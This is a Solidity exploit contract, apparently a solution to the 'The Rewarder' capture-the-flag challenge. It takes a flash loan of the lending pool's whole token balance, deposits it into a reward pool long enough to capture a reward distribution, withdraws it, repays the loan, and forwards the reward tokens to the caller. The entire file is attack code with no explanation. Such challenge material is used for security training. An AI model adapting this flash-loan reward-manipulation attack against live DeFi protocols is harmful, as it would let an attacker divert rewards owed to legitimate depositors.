pragma solidity ^0.8.0;

interface FlashLoanPool {
    function flashLoan(uint256 amount) external;
}

interface RewardPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external returns (uint256);
}

interface IToken {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract TheRewarderAttacker {

    address private flashLoanPool;
    address private rewardPool;
    address private dvt;
    address private rewardToken;
    constructor(address fPoolAddress,address rPoolAddress,address dvtAddress,address rewardTokenAddress) {
        flashLoanPool = fPoolAddress;
        rewardPool = rPoolAddress;
        dvt= dvtAddress;
        rewardToken = rewardTokenAddress;
    }

    function receiveFlashLoan(uint256 amount) external {
        IToken(dvt).approve(rewardPool,amount);
        RewardPool(rewardPool).deposit(amount);
        RewardPool(rewardPool).withdraw(amount);
        require(IToken(rewardToken).balanceOf(address(this)) >= 99 ether,"reward token low!");
        IToken(dvt).transfer(flashLoanPool,amount);
    }

    function attack() public {
        uint256 amount = IToken(dvt).balanceOf(flashLoanPool);
        FlashLoanPool(flashLoanPool).flashLoan(amount);
        uint256 reward = IToken(rewardToken).balanceOf(address(this));
        IToken(rewardToken).transfer(msg.sender,reward);
    }

}